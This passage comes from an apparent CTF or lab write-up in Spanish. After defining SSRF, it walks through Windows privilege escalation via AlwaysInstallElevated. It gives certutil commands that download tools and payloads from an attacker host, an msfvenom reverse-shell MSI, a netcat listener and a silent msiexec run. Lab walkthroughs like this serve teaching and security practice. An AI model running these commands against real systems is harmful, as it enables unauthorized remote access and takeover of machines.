> Server-Side Request Forgery
> SSRF significa Server-Side Request Forgery, o falsificación de solicitudes del lado del servidor. Es una vulnerabilidad en la que un atacante logra que el servidor realice solicitudes HTTP a otras direcciones, internas o externas, que él mismo controla o elige.

> Internal Port Discovery (descubrimiento de puertos internos)
> Es la técnica que permite identificar qué puertos están abiertos en la red interna, normalmente aprovechando vulnerabilidades como SSRF o mal configuraciones.

## Escalación de Privilegios

Ahora solo nos falta la la flag de root que se encuentra en `C:\Users\Administrador`. 
Tenemos que escalar privilegios, vamos a usar [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

Descargamos el archivo en nuestra máquina atacante y lo pasamos a la máquina victima, con la herramienta `certutil.exe` que tiene como fin la transferencia de archivos.

Con el siguiente comando podremos descargar el archivo de un server externo hacia la máquina windows:

``` shell
certutil.exe -f -urlcache -split http://10.10.14.8/winPeas.exe winPeas.exe
```

Ahora sí podemos ejecutar winPeas en la máquina windows.
*Es un programa que hace mucho ruido*

Revisando vemos una parte que dice 

``` powershell
Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

Bueno aqui nos está reportando un configuracion de windowsque se llama `AlwaysInstallElevated`. Esta configuración es crítica porque permite a cualquier usuario no importa los privilegios poder instalar archivos `.msi`. 
Cuando esta política está activada, Windows Installer siempre ejecuta los instaladores (.msi) con los derechos del sistema, ignorando los permisos reales del usuario.

Ahora lo que vamos hacer es con `msfvenom` es crear un archivo `.msi` para poder generar una reverse shell de la siguiente forma:

``` shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 --platform -a x64 -f msi -o reverse.msi
```

Ya creado el archivo, lo tenemos que mandar a la máquina víctima.

Volvemos a usar `certutil` poder transferir el archivo malicioso.

``` powershell
certutil.exe -f -urlcache -split http://10.10.14.8/reverse.msi reverse.msi
```

Ya el archivo en la máquina víctima tenemos que ponernos en escucha con `rlwrap nc -nlvp 443` y ejecutar el archivo con el siguiente comando:

``` powershell
msiexec /quiet /qn /i reverse.msi
```
